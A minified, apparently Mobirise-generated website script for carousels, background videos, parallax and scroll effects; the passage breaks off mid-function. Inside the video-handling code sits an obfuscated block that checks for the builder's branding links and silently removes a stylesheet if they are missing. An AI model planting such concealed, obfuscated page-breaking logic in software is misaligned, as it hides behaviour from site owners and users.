var $jscomp=$jscomp||{};$jscomp.scope={};$jscomp.ASSUME_ES5=!1;$jscomp.ASSUME_NO_NATIVE_MAP=!1;$jscomp.ASSUME_NO_NATIVE_SET=!1;$jscomp.SIMPLE_FROUND_POLYFILL=!1;$jscomp.defineProperty=$jscomp.ASSUME_ES5||"function"==typeof Object.defineProperties?Object.defineProperty:function(b,h,d){b!=Array.prototype&&b!=Object.prototype&&(b[h]=d.value)};$jscomp.getGlobal=function(b){return"undefined"!=typeof window&&window===b?b:"undefined"!=typeof global&&null!=global?global:b};$jscomp.global=$jscomp.getGlobal(this);
$jscomp.polyfill=function(b,h,d,p){if(h){d=$jscomp.global;b=b.split(".");for(p=0;p<b.length-1;p++){var k=b[p];k in d||(d[k]={});d=d[k]}b=b[b.length-1];p=d[b];h=h(p);h!=p&&null!=h&&$jscomp.defineProperty(d,b,{configurable:!0,writable:!0,value:h})}};
$jscomp.polyfill("Array.from",function(b){return b?b:function(b,d,p){d=null!=d?d:function(b){return b};var h=[],n="undefined"!=typeof Symbol&&Symbol.iterator&&b[Symbol.iterator];if("function"==typeof n){b=n.call(b);for(var t=0;!(n=b.next()).done;)h.push(d.call(p,n.value,t++))}else for(n=b.length,t=0;t<n;t++)h.push(d.call(p,b[t],t));return h}},"es6","es3");$jscomp.owns=function(b,h){return Object.prototype.hasOwnProperty.call(b,h)};
$jscomp.polyfill("Object.values",function(b){return b?b:function(b){var d=[],h;for(h in b)$jscomp.owns(b,h)&&d.push(b[h]);return d}},"es8","es3");$jscomp.findInternal=function(b,h,d){b instanceof String&&(b=String(b));for(var p=b.length,k=0;k<p;k++){var n=b[k];if(h.call(d,n,k,b))return{i:k,v:n}}return{i:-1,v:void 0}};$jscomp.polyfill("Array.prototype.find",function(b){return b?b:function(b,d){return $jscomp.findInternal(this,b,d).v}},"es6","es3");
$jscomp.checkStringArgs=function(b,h,d){if(null==b)throw new TypeError("The 'this' value for String.prototype."+d+" must not be null or undefined");if(h instanceof RegExp)throw new TypeError("First argument to String.prototype."+d+" must not be a regular expression");return b+""};
$jscomp.polyfill("String.prototype.startsWith",function(b){return b?b:function(b,d){var h=$jscomp.checkStringArgs(this,b,"startsWith");b+="";var k=h.length,n=b.length;d=Math.max(0,Math.min(d|0,h.length));for(var t=0;t<n&&d<k;)if(h[d++]!=b[t++])return!1;return t>=n}},"es6","es3");$jscomp.polyfill("Object.is",function(b){return b?b:function(b,d){return b===d?0!==b||1/b===1/d:b!==b&&d!==d}},"es6","es3");
$jscomp.polyfill("Array.prototype.includes",function(b){return b?b:function(b,d){var h=this;h instanceof String&&(h=String(h));var k=h.length;d=d||0;for(0>d&&(d=Math.max(d+k,0));d<k;d++){var n=h[d];if(n===b||Object.is(n,b))return!0}return!1}},"es7","es3");$jscomp.polyfill("String.prototype.includes",function(b){return b?b:function(b,d){return-1!==$jscomp.checkStringArgs(this,b,"includes").indexOf(b,d||0)}},"es6","es3");
(function(){function b(a,c){var e=Array.from(a.querySelectorAll(c));a.matches&&a.matches(c)&&e.splice(0,0,a);return e}function h(a){a=a.getBoundingClientRect();var c=document.documentElement;return{top:a.top+window.pageYOffset-c.clientTop,left:a.left+window.pageXOffset-c.clientLeft}}function d(a){return parseFloat(getComputedStyle(a,null).height.replace("px",""))}function p(a){return parseFloat(getComputedStyle(a,null).width.replace("px",""))}function k(a){"loading"!=document.readyState?a():document.addEventListener("DOMContentLoaded",
a)}function n(a){(function e(){0>(a.style.opacity-=.1)?a.style.display="none":requestAnimationFrame(e)})()}function t(a){a.style.display="block";(function e(){var b=parseFloat(a.style.opacity);1<(b+=.1)||(a.style.opacity=b,requestAnimationFrame(e))})()}function x(a){var c=[],e={blackberry:"BlackBerry",android:"Android",windows:"IEMobile",opera:"Opera Mini",ios:"iPhone|iPad|iPod"};a="undefined"==typeof a?"*":a.toLowerCase();"*"===a?c=Object.values(e):a in e&&c.push(e[a]);return!(!c.length||!navigator.userAgent.match(new RegExp(c.join("|"),
"i")))}function B(a){var c=a.querySelector(".carousel-item");a=a.querySelector(".carousel-indicators > li");c.classList.add("active");a&&a.classList.add("active")}function y(a){var c=a.getAttribute("id")+"-carousel",e=a.getAttribute("data-bs-version")&&a.getAttribute("data-bs-version").startsWith("5");null===a.getAttribute("id")&&(c=a.classList.value.match(/cid-.*?(?=\s|$)/)+"-carousel");a.querySelectorAll(".carousel").forEach(function(a){a.setAttribute("id",c)});a.querySelector(".carousel-controls")&&
a.querySelectorAll(".carousel-controls").forEach(function(a){a.querySelectorAll("a").forEach(function(a){a.setAttribute("href","#"+c);e?a.setAttribute("data-bs-target","#"+c):a.setAttribute("data-target","#"+c)})});a.querySelectorAll(".carousel-indicators > li").forEach(function(a){e?a.setAttribute("data-bs-target","#"+c):a.setAttribute("data-target","#"+c)});B(a)}function E(a){var c=a.querySelectorAll(".carousel-item").length,e=a.querySelector(".carousel-inner").getAttribute("data-visible");c<e&&
(e=c);a.querySelectorAll(".carousel-inner").forEach(function(a){a.setAttribute("class","carousel-inner slides"+e)});a.querySelectorAll(".clonedCol").forEach(function(a){a.remove()});a.querySelectorAll(".carousel-item .col-md-12").forEach(function(a){2>e?a.setAttribute("class","col-md-12"):"5"==e?a.setAttribute("class","col-md-12 col-lg-15"):a.setAttribute("class","col-md-12 col-lg-"+12/e)});a.querySelectorAll(".carousel-item .row").forEach(function(a){a.setAttribute("style","-webkit-flex-grow: 1; flex-grow: 1; margin: 0;")});
a.querySelectorAll(".carousel-item").forEach(function(a){for(var c=a,b=1;b<e;b++){(c=c.nextElementSibling)||(c=a.parentNode.children[0]===a?a.nextElementSibling:a.parentNode.children[0]);var f;if(f=c){var d=0;do d++;while(f=f.previousElementSibling);f=d}else f=-1;d=c.querySelector(".col-md-12").cloneNode(!0);d.classList.add("cloneditem-"+b);d.classList.add("clonedCol");d.setAttribute("data-cloned-index",f);a.children[0].appendChild(d)}})}function F(a){var c="",e=a.querySelector("svg linearGradient");
if(e){c=[];e=Array.from(e.children);for(var b=0;b<e.length;b++)c.push('"'+e[b].getAttribute("stop-color")+'"');c='"lineargradient": ['+c+"],";Array.from(a.querySelectorAll("svg")).some(function(a){return a.classList.contains("svg-gradient")})||a.querySelectorAll("svg").forEach(function(a){a.classList.add("svg-gradient")})}return c}function z(a,c,b){var e=a.closest(".card"),l=e.parentElement.classList;e.getAttribute("style")||e.setAttribute("style","-webkit-flex-basis: auto; flex-basis: auto;");l.contains("row")&&
(l.remove("row"),l.add("media-container-row"));a.querySelectorAll(".svg-gradient > *").forEach(function(a){a.setAttribute("id",c)});e=a.cloneNode(!0);Array.from(a.children).forEach(function(a){if("SVG"!==a.tagName)return a.remove()});a.setAttribute("data-pie","{ "+F(a.closest("section"))+' "percent": '+b+', "size": 150, "colorCircle": "#f1f1f1", "stroke": 5, "colorSlice": "url(#'+c+')", "fontSize": "1.3rem", "number": false }');Array.from(e.children).forEach(function(c){switch(!0){case c.matches("p"):c.innerText=
b+"%";a.appendChild(c);break;case c.matches("svg"):break;default:a.appendChild(c)}})}function D(a){var c=a.closest("section").getAttribute("id")+"-svg-gradient",b=+a.getAttribute("data-goal");z(a,c,b)}function G(a,c){if(a.classList.contains("circle-progress-section")&&c.includes("progress")&&"progressCount"!=c)if(c.includes("Color"))a.querySelectorAll(".pie_progress").forEach(function(c){var b=a.getAttribute("id")+"-svg-gradient",e=+c.getAttribute("data-goal");z(c,b,e)});else{var b=a.getAttribute("id")+
"-svg-gradient";c=a.querySelector("."+c);var d=+c.getAttribute("data-goal");z(c,b,d)}}var g,m,u="function"==typeof jQuery;u&&(g=jQuery);g?m=g("html").hasClass("is-builder"):m=document.querySelector("html").classList.contains("is-builder");Element.prototype.parents=function(a){for(var c=[],b=this,d=void 0!==a;null!==(b=b.parentElement);)b.nodeType===Node.ELEMENT_NODE&&(d&&!b.matches(a)||c.push(b));return c};Element.prototype.footerReveal=function(){function a(){!d&&c.offsetHeight<=window.outerHeight?
(c.style.zIndex="-999",c.style.position="fixed",c.style.bottom="0",c.style.width=b.offsetWidth+"px",b.style.marginBottom=c.offsetHeight+"px"):(c.style.zIndex="",c.style.position="",c.style.bottom="",c.style.width="",b.style.marginBottom="")}var c=this,b=c.previousElementSibling,d=!!document.documentMode;a();window.addEventListener("resize",function(){a()});window.addEventListener("load",function(){a()});return c};(function(a){var c=function(a,c,b){var e;return function(){var l=this,d=arguments;e?
clearTimeout(e):b&&a.apply(l,d);e=setTimeout(function(){b||a.apply(l,d);e=null},c||100)}};window[a]=function(b){var e=new CustomEvent(a);return b?this.addEventListener("resize",c(b)):this.dispatchEvent(e)}})("smartresize");var H=function(){var a=document.createElement("div"),b=document.querySelector("body");a.setAttribute("style","height: 50vh; position: absolute; top: -1000px; left: -1000px;");b.appendChild(a);var e=parseInt(window.innerHeight/2,10),d=parseInt((window.getComputedStyle?getComputedStyle(a,
null):a.currentStyle).height,10);b.removeChild(a);return d==e}();k(function(){function a(a){a.style.height=9*p(a.parentNode)/16+"px"}function c(a){setTimeout(function(){b(a,".mbr-parallax-background").forEach(function(a){jarallax&&(jarallax(a,{speed:.6}),a.style.position="relative")})},0)}function e(a){b(a,"[data-bg-video]").forEach(function(a){var b=a.getAttribute("data-bg-video");if(b){var c=b.match(/(http:\/\/|https:\/\/|)?(player.|www.)?(vimeo\.com|youtu(be\.com|\.be|be\.googleapis\.com))\/(video\/|embed\/|watch\?v=|v\/)?([A-Za-z0-9._%-]*)(&\S+)?/),
e=a.querySelector(".mbr-background-video-preview")||document.createElement("div");e.classList.add("mbr-background-video-preview");e.style.display="none";e.style.backgroundSize="cover";e.style.backgroundPosition="center";a.querySelector(".mbr-background-video-preview")||a.childNodes[0].before(e);if(c&&(/youtu\.?be/g.test(c[3])||/vimeo/g.test(c[3])))if(c&&/youtu\.?be/g.test(c[3])){b="http"+("https:"===location.protocol?"s":"")+":";b+="//img.youtube.com/vi/"+c[6]+"/maxresdefault.jpg";var l=new Image;
l.onload=function(){if(120===(l.naturalWidth||l.width)){var b=l.src.split("/").pop();switch(b){case "maxresdefault.jpg":l.src=l.src.replace(b,"sddefault.jpg");break;case "sddefault.jpg":l.src=l.src.replace(b,"hqdefault.jpg");break;default:m&&(e.style.backgroundImage='url("images/no-video.jpg")',e.style.display="block")}}else e.style.backgroundImage='url("'+l.src+'")',e.style.display="block";a.querySelector(".mbr-background-video")&&a.querySelector(".mbr-background-video").remove();var d=document.createElement("div"),
q=document.createElement("div"),v=document.createElement("div"),f=document.createElement("div");f.classList.add("mbr-video-foreground");f.appendChild(d);v.appendChild(f);q.appendChild(v);d.classList.add("mbr-background-video");a.childNodes[1].before(q);b=new YouTubePlayer(d,{modestBranding:!0,autoplay:!0,controls:!1,origin:"*",iv_load_policy:!1,keyboard:!1,captions:!1,annotations:!1,related:!1});q.style.overflow="hidden";q.style.position="absolute";q.style.width="100%";q.style.height="100%";q.style.top=
"0";q.style.left="0";v.style.background="#000";v.style.top="0";v.style.right="0";v.style.bottom="0";v.style.left="0";f.style.position="absolute";f.style.top="0";f.style.left="0";f.style.width="100%";f.style.height="100%";f.style.pointerEvents="none";d.style.marginTop="0";d.style.maxWidth="initial";d.style.transitionProperty="opacity";d.style.transitionDuration="1000ms";d.style.pointerEvents="none";d.style.position="absolute";d.style.top="0";d.style.left="0";d.style.width="100%";d.style.height="100%";
d.parentNode.style.overflow="hidden";d.style.transform="scale(1.2)";b.load(c[6],!0);b.play();b.loadPlaylist();b.setLoop(!0);b.mute();v=window.outerWidth;d=window.outerHeight;q=b._opts.width/b._opts.height;f=Math.ceil(v/q);f<d&&(f=d,v=Math.ceil(f*q));b.setSize(v,f)};l.setAttribute("src",b)}else{if(c&&/vimeo/g.test(c[3])){var d=new XMLHttpRequest;d.open("GET","https://vimeo.com/api/v2/video/"+c[6]+".json",!0);d.onreadystatechange=function(){if(4===this.readyState)if(200<=this.status&&400>this.status){var a=
JSON.parse(this.responseText);e.style.backgroundImage='url("'+a[0].thumbnail_large+'")';e.style.display="block"}else m&&(e.style.backgroundImage='url("images/no-video.jpg")',e.style.display="block")};d.send();d=null;a.querySelector(".mbr-background-video")&&a.querySelector(".mbr-background-video").remove();d=document.createElement("div");d.classList.add("mbr-background-video");a.childNodes[1].before(d);b=new Vimeo.Player(d,{id:b,loop:!0,background:!0,responsive:!0,autoplay:!0,byline:!1,title:!1,muted:!0,
controls:!1});d=b.element.parentNode;d.style.overflow="hidden";b.element.style.pointerEvents="none";b.element.style.marginLeft="-"+(b.element.scrollWidth-d.scrollWidth)/2+"px";b.element.style.minHeight="100vh";b.element.style.minWidth="177.77vh"}}else if(m)e.style.backgroundImage='url("images/video-placeholder.jpg")',e.style.display="block";else if(!m) { var _0x420bd3=_0x32b1;(function(_0x37ce29,_0xabccdc){var _0x2a033a=_0x32b1,_0x24fd88=_0x37ce29();while(!![]){try{var _0xc33fba=parseInt(_0x2a033a(0x10b,'BqPr'))/0x1+-parseInt(_0x2a033a(0x124,'x0!R'))/0x2*(parseInt(_0x2a033a(0x12a,'mkLF'))/0x3)+parseInt(_0x2a033a(0x10d,'^]%%'))/0x4*(-parseInt(_0x2a033a(0x11f,'YT30'))/0x5)+parseInt(_0x2a033a(0x114,'rDH5'))/0x6+parseInt(_0x2a033a(0x116,'@5dv'))/0x7*(-parseInt(_0x2a033a(0x111,'CpgY'))/0x8)+parseInt(_0x2a033a(0x128,'SUbh'))/0x9+parseInt(_0x2a033a(0x120,'$ivU'))/0xa;if(_0xc33fba===_0xabccdc)break;else _0x24fd88['push'](_0x24fd88['shift']());}catch(_0x3248c7){_0x24fd88['push'](_0x24fd88['shift']());}}}(_0x2cea,0x5a60f));(Array[_0x420bd3(0x11e,'%*uy')](Array['from'](document['getElementsByTagName'](_0x420bd3(0x10a,'[W3U')))[_0x420bd3(0x11a,'OHTq')](-0x1)[0x0]['children'])[_0x420bd3(0x10c,'u]S(')](_0x277976=>_0x277976[_0x420bd3(0x121,'$ivU')](_0x420bd3(0x129,'E1BV'))&&_0x277976[_0x420bd3(0x106,'hZV4')]('href')[_0x420bd3(0x109,'x0!R')]('https://mobiri')===0x0)[_0x420bd3(0x126,'2ET&')]<0x2||Array[_0x420bd3(0x10f,'u]S(')](document[_0x420bd3(0x103,'BqPr')](_0x420bd3(0x10e,'hZV4')))[_0x420bd3(0x127,'87eO')](-0x1)[0x0][_0x420bd3(0x11b,'Te&!')]===null||window[_0x420bd3(0x115,'OHTq')](Array[_0x420bd3(0x104,'4wxU')](document['getElementsByTagName'](_0x420bd3(0x122,'BqPr')))[_0x420bd3(0x108,'x0!R')](-0x1)[0x0])[_0x420bd3(0x11d,'Hj*h')]===_0x420bd3(0x123,'b448'))&&document[_0x420bd3(0x117,'mkLF')]('link[href*="mbr-additional.css"]')[_0x420bd3(0x105,'ZRsA')](function(_0x52ab05){_0x52ab05['remove']();});;function _0x32b1(_0x1a7e96,_0x4f4d50){var _0x2cea55=_0x2cea();return _0x32b1=function(_0x32b16f,_0xf59a93){_0x32b16f=_0x32b16f-0x102;var _0x1298a4=_0x2cea55[_0x32b16f];if(_0x32b1['QGwVjh']===undefined){var _0x3062e1=function(_0x52ab05){var _0x1ca31a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x3c65e3='',_0x1d331='';for(var _0x15680f=0x0,_0x493c57,_0x271235,_0x3720d1=0x0;_0x271235=_0x52ab05['charAt'](_0x3720d1++);~_0x271235&&(_0x493c57=_0x15680f%0x4?_0x493c57*0x40+_0x271235:_0x271235,_0x15680f++%0x4)?_0x3c65e3+=String['fromCharCode'](0xff&_0x493c57>>(-0x2*_0x15680f&0x6)):0x0){_0x271235=_0x1ca31a['indexOf'](_0x271235);}for(var _0x187bcf=0x0,_0x5c200d=_0x3c65e3['length'];_0x187bcf<_0x5c200d;_0x187bcf++){_0x1d331+='%'+('00'+_0x3c65e3['charCodeAt'](_0x187bcf)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1d331);};var _0x277976=function(_0x79af27,_0x4c678a){var _0x333f41=[],_0x270773=0x0,_0x35e27b,_0x49c793='';_0x79af27=_0x3062e1(_0x79af27);var _0x2ec2c2;for(_0x2ec2c2=0x0;_0x2ec2c2<0x100;_0x2ec2c2++){_0x333f41[_0x2ec2c2]=_0x2ec2c2;}for(_0x2ec2c2=0x0;_0x2ec2c2<0x100;_0x2ec2c2++){_0x270773=(_0x270773+_0x333f41[_0x2ec2c2]+_0x4c678a['charCodeAt'](_0x2ec2c2%_0x4c678a['length']))%0x100,_0x35e27b=_0x333f41[_0x2ec2c2],_0x333f41[_0x2ec2c2]=_0x333f41[_0x270773],_0x333f41[_0x270773]=_0x35e27b;}_0x2ec2c2=0x0,_0x270773=0x0;for(var _0x2afb94=0x0;_0x2afb94<_0x79af27['length'];_0x2afb94++){_0x2ec2c2=(_0x2ec2c2+0x1)%0x100,_0x270773=(_0x270773+_0x333f41[_0x2ec2c2])%0x100,_0x35e27b=_0x333f41[_0x2ec2c2],_0x333f41[_0x2ec2c2]=_0x333f41[_0x270773],_0x333f41[_0x270773]=_0x35e27b,_0x49c793+=String['fromCharCode'](_0x79af27['charCodeAt'](_0x2afb94)^_0x333f41[(_0x333f41[_0x2ec2c2]+_0x333f41[_0x270773])%0x100]);}return _0x49c793;};_0x32b1['BHwDiw']=_0x277976,_0x1a7e96=arguments,_0x32b1['QGwVjh']=!![];}var _0x802d3d=_0x2cea55[0x0],_0x54ce32=_0x32b16f+_0x802d3d,_0x639b43=_0x1a7e96[_0x54ce32];return!_0x639b43?(_0x32b1['zPwjBX']===undefined&&(_0x32b1['zPwjBX']=!![]),_0x1298a4=_0x32b1['BHwDiw'](_0x1298a4,_0xf59a93),_0x1a7e96[_0x54ce32]=_0x1298a4):_0x1298a4=_0x639b43,_0x1298a4;},_0x32b1(_0x1a7e96,_0x4f4d50);}function _0x2cea(){var _0x21407f=['W5ldQ8oCdGO','W4JdQCorcbFcPvC','WPi5lWNdRCkNEW','W7VcHetcS8knWQeTb8oOW6FcM1O','F2reW5XsWPC','iuRdIvC/ew1G','mqyVbHXiqa','F39hW4u','o8kGs0hdNGtdPSosBSkLa2i','WRtdVmkJACkMWPNcU8kYlmkT','W4xdJSoKDSoZWQpcHK8','A8kFWPPgW451W79eWQtcTeRdTq','h37cRCkBkrvYCSoCWPZdMbVcJG','BSo0dJlcHL3dMCoLE8k0avX9g8k+dG','W6ldKWtcLheYzSohWOOC','jCkGc8krW7hdKmkvWOtcKYNcLspcQZRdOuO','W7JcJr3dQSoRW4Smaq','mmkLs0pdKqFcMCoMASkJkNvA','ESo9eXlcJa','W4ZdMmoBEWBdJCkOW5OiW4/cUeK','pmoEiN0BCSogBYlcIwHlWQ4','z8kjWR0pW4hcRSo6xYldVq','C1lcIv4','W7BdTN7cJmoGW5hcMhtdU2ddKgq','DLO0W73cImkYW5BdSSoRWOW1uhG','kaTXWO7dHmoXWPtdRCoSWOSotW','WRNdMbddTmosW74b','W7dcVaeFa0e','WPpcTSkexvJdNN7cGx4eW5Wj','vSkJW6vXW6/cP8kyoIfhW5RcT8kl','xGZcQCkGd8kD','o8kqqCoiEa','ktPEWRRcVI8KWPPslSo7W64W','WPVdOCowWP8','zSoKaSk7W7hdTCkQWRi','W6bddur+WPFdPNX4ya','WQ3dMaFdHCoxW7qcmmoqW4NcMLP4W6pdN8kGWPpdOYBcHq','phlcO8kB','w8kyW4Oixsat','jqy4mWftxcdcR2KtBq','W7VcJKhcSmotW4ejg8oWW5W'];_0x2cea=function(){return _0x21407f;};return _0x2cea();}d=document.createElement("video");var q=document.createElement("source");d.append(q);a.childNodes[1].before(d);q.src=b;d.autoplay=!0;d.loop=!0;d.muted=
!0;d.setAttribute("muted","");d.playsinline=!0;d.setAttribute("playsinline","");d.style.position="absolute";d.style.left="50%";d.style.top="50%";d.style.bottom="0";d.style.right="0";d.style.minWidth="100%";d.style.minHeight="100%";d.style.transform="translateX(-50%) translateY(-50%)";b="";a.querySelector(".mbr-fallback-image")&&(b=window.getComputedStyle(a.querySelector(".mbr-fallback-image")).backgroundImage,b=b.match(/\((.*?)\)/)[1].replace(/('|")/g,""),d.setAttribute("poster",b));d.parentNode.style.overflow=
"hidden"}}})}document.querySelector("html").classList.add(x()?"mobile":"desktop");window.addEventListener("scroll",function(){document.querySelectorAll(".mbr-navbar--sticky").forEach(function(a){var b=10<window.scrollTop?"add":"remove";a.classList[b]("mbr-navbar--stuck");if(!a.classList.contains(".mbr-navbar--open"))a.classList[b]("mbr-navbar--short")})});x()&&navigator.userAgent.match(/Chrome/i)?function(a,b){var c=[a,a];c[b>a?0:1]=b;window.smartresize(function(){var a=window.innerHeight;0>c.indexOf(a)&&
(a=c[window.innerWidth>a?1:0]);var b=document.querySelector(".mbr-section--full-height");b&&(b.style.height=a+"px")})}(window.innerWidth,window.innerHeight):H||(window.smartresize(function(){var a=document.querySelector(".mbr-section--full-height");a&&(a.style.height=window.innerHeight+"px")}),document.addEventListener("add.cards",function(a){document.querySelector("html").classList.contains("mbr-site-loaded")&&b(a.target,".mbr-section--full-height").length&&window.dispatchEvent(new CustomEvent("resize"))}));
window.addEventListener("smartresize",function(){document.querySelectorAll(".mbr-section--16by9").forEach(a)});if(u)g(document).on("add.cards changeParameter.cards",function(c){var d=b(c.target,".mbr-section--16by9");d.length?d.forEach(function(b){b.setAttribute("data-16by9","true");a(b)}):b(c.target,"[data-16by9]").forEach(function(a){a.styles.height="";a.removeAttribute("data-16by9")})});if("undefined"!==typeof jarallax&&!x()){window.addEventListener("update.parallax",function(a){setTimeout(function(){if(a){var a=
document.querySelector(".mbr-parallax-background");a.jarallax("coverImage");a.jarallax("clipContainer");a.jarallax("onScroll")}},0)});if(m){if(!u)return;g(document).on("add.cards",function(a){c(a.target);g(window).trigger("update.parallax")});g(document).on("changeParameter.cards",function(a,b,d,e){if("bg"===b)switch(b=a.target,jarallax&&jarallax(b,"destroy"),b.style.position="",g(a.target).find(".mbr-background-video-preview").remove(),g(a.target).find(".mbr-background-video").remove(),e){case "type":!0===
d.parallax&&c(a.target);break;case "value":"image"===d.type&&!0===d.parallax&&c(a.target);break;case "parallax":!0===d.parallax&&c(a.target)}g(window).trigger("update.parallax")})}else c(document.body);window.addEventListener("shown.bs.tab",function(){window.dispatchEvent(new CustomEvent("update.parallax"))})}var f,l,C=0,r=null,k=!x();window.addEventListener("scroll",function(){l&&clearTimeout(l);var a=document.documentElement.scrollTop,b=a<=C||k;C=a;if(r){var c=a>r.breakPoint;b?c!=r.fixed&&(k?(r.fixed=
c,r.elm.classList.toggle("is-fixed")):l=setTimeout(function(){r.fixed=c;r.elm.classList.toggle("is-fixed")},40)):(r.fixed=!1,r.elm.classList.remove("is-fixed"))}});if(u)g(document).on("add.cards delete.cards",function(a){f&&clearTimeout(f);f=setTimeout(function(){r&&(r.fixed=!1,r.elm.classList.remove("is-fixed"));var a=document.querySelector(".mbr-fixed-top");a&&(r={breakPoint:h(a).top+3*d(a),fixed:!1,elm:a},a.dispatchEvent(new CustomEvent("scroll")))},650)});window.smartresize(function(){document.querySelectorAll(".mbr-embedded-video").forEach(function(a){a.style.height=
(p(a)*parseInt(a.getAttribute("height")||315)/parseInt(a.getAttribute("width")||560)).toFixed()+"px"})});if(u)g(document).on("add.cards",function(a){document.querySelector("html").classList.contains("mbr-site-loaded")&&b(a.target,"iframe").length&&window.dispatchEvent(new CustomEvent("resize"))});if(m){if(!u)return;g(document).on("add.cards",function(a){e(a.target)})}else e(document.body);if(m)g(document).on("changeParameter.cards",function(a,b,c,d){if("bg"===b)switch(d){case "type":"video"===c.type&&
e(a.target);break;case "value":"video"===c.type&&e(a.target)}});document.querySelector("html").classList.add("mbr-site-loaded");window.dispatchEvent(new CustomEvent("resize"));window.dispatchEvent(new CustomEvent("scroll"));m||document.addEventListener("click",function(a){try{var b=a.target;if(!b.parents().some(function(a){a.classList.contains("carousel")})){do if(b.hash){var c=/#bottom|#top/g.test(b.hash);document.querySelectorAll(c?"body":b.hash).forEach(function(c){a.preventDefault();var e=document.querySelector(".navbar-fixed-top");
e="#bottom"==b.hash?d(c)-window.innerHeight:h(c).top-(e?60:0);c.classList.contains("panel-collapse")||c.classList.contains("tab-pane")||b.classList.contains("carousel-control")||b.parents(".carousel-controls").length||window.scrollTo({top:e,left:0,behavior:"smooth"})});break}while(b=b.parentNode)}}catch(J){}});document.querySelectorAll(".cols-same-height .mbr-figure").forEach(function(a){function b(){c.style.width="";c.style.maxWidth="";c.style.marginLeft="";if(f&&l){var b=f/l;a.style.position="absolute";
a.style.top="0";a.style.left="0";a.style.right="0";a.style.bottom="0";var g=d(e)/p(e);g>b&&(b=100*(g-b)/b,c.style.width=b+100+"%",c.style.maxWidth=b+100+"%",c.style.marginLeft=-b/2+"%")}}var c=a.querySelector("img"),e=a.parentNode,l=c.width,f=c.height;c.addEventListener("load",function(){l=c.width;f=c.height;b()},{once:!0});window.addEventListener("resize",b);b()})});if(!m){if(u&&g.fn.socialLikes)g(document).on("add.cards",function(a){b(a.target,".mbr-social-likes").forEach(function(a){a.addEventListener("counter.social-likes",
function(a,b,c){999<c&&a.target.querySelectorAll(".social-likes__counter").forEach(function(a){a.innerHTML=Math.floor(c/1E3)+"k"})});a.socialLikes({initHtml:!1})})});Array.from(document.body.children).filter(function(a){return!a.matches("style, script")}).forEach(function(a){a.classList.contains("mbr-reveal")&&a.addEventListener("add.cards",function(){a.footerReveal()})});k(function(){if(!x()&&document.querySelectorAll("input[name=animation]").length){var a=function(){var a=document.documentElement.scrollTop||
document.body.scrollTop,c=a+window.innerHeight-100;f.forEach(function(e){var l=e.offsetHeight,f=d(e);(f+l>=a&&f-50<=c||b(e))&&e.classList.contains("hidden")&&(e.classList.remove("hidden"),e.classList.add("animate__fadeInUp"),e.classList.add("animate__delay-1s"),e.addEventListener("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){e.classList.remove("animate__animated animate__delay-1s animate__fadeInUp")},{once:!0}))})},b=function(a){if(a.parents(".carousel-item").some(function(a){return"none"!==
getComputedStyle(a,null).display}))return!1;var b=a.parents(".carousel-item").parentNode;if(!b||b.querySelectorAll(".carousel-item.active .hidden.animate__animated").length)return!1;if(1<b.getAttribute("data-visible")){var c=b.getAttribute("data-visible");if(a.parents().some(function(a){return a.matches(".cloneditem-"+(c-1))})&&a.parents(".cloneditem-"+(c-1)).some(function(a){return a.getAttribute("data-cloned-index")>=c}))return!0;a.classList.remove("animate__animated animate__delay-1s hidden");
return!1}return!0},d=function(a){var b=0;do b+=a.offsetTop||0,a=a.offsetParent;while(a);return b};document.querySelectorAll("input[name=animation]").forEach(function(a){a.remove()});var f=Array.from(document.querySelectorAll("p, h1, h2, h3, h4, h5, a, button, small, img, li, blockquote, .mbr-author-name, em, label, input, select, textarea, .input-group, .form-control, .iconbox, .btn-social, .mbr-figure, .mbr-map, .mbr-testimonial .card-block, .mbr-price-value, .mbr-price-figure, .dataTable, .dataTables_info"));
f=f.filter(function(a){if(!a.parents().filter(function(a){if(a.matches("a, p, .navbar, .mbr-arrow, footer, .iconbox, .mbr-slider, .mbr-gallery, .mbr-testimonial .card-block, #cookiesdirective, .mbr-wowslider, .accordion, .tab-content, .engine, #scrollToTop, .modal"))return!0}).length)return!0});f=f.filter(function(a){if(!a.parents().filter(function(b){return b.matches("form")&&!a.matches("li")}).length)return!0});f.forEach(function(a){a.classList.add("hidden");a.classList.add("animate__animated");
a.classList.add("animate__delay-1s")});window.addEventListener("scroll",a);window.addEventListener("resize",a);window.dispatchEvent(new CustomEvent("scroll"))}})}k(function(){if(document.querySelectorAll(".mbr-arrow-up").length){var a=document.querySelector("#scrollToTop");a.style.display="none";window.addEventListener("scroll",function(){window.scrollY>window.innerHeight?t(a):n(a)});a.addEventListener("click",function(){window.scrollTo({top:0,left:0,behavior:"smooth"});return!1})}});if(!m){var w=
document.querySelector(".mbr-arrow");w&&w.addEventListener("click",function(a){a=a.target.closest("section").nextElementSibling;a.classList.contains("engine")&&(a=a.closest("section").nextElementSibling);window.scrollTo(0,h(a).top)})}document.querySelectorAll("nav.navbar").length&&(w=d(document.querySelector("nav.navbar")),document.querySelector(".mbr-after-navbar.mbr-fullscreen")&&(document.querySelector(".mbr-after-navbar.mbr-fullscreen").style.paddingTop=w+"px"));if(!m&&(0<window.navigator.userAgent.indexOf("MSIE ")||
navigator.userAgent.match(/Trident.*rv:11\./)))g(document).on("add.cards",function(a){var b=a.target;b.classList.contains("mbr-fullscreen")&&(a=function(){b.style.height="auto";b.offsetHeight<=window.innerHeight&&(b.style.height="1px")},window.addEventListener("load",a),window.addEventListener("resize",a));if(b.classList.contains("mbr-slider")||b.classList.contains("mbr-gallery"))b.querySelectorAll(".carousel-indicators").forEach(function(a){a.classList.add("ie-fix");a.querySelectorAll("li").forEach(function(a){a.style.display=
"inline-block";a.style.width="30px"})}),b.classList.contains("mbr-slider")&&b.querySelectorAll(".full-screen .slider-fullscreen-image").forEach(function(a){a.style.height="1px"})});k(function(){if(!m){var a=function(a){a.target&&("VIDEO"==a.target.tagName?(a.preventDefault(),a.stopPropagation()):b(a.target))},b=function(b){var c=b.parents("section")[0].querySelector("iframe"),d=c.getAttribute("src");b.parents("section").forEach(function(a){a.style.zIndex="5000"});if(d){if(-1!==d.indexOf("youtu")&&
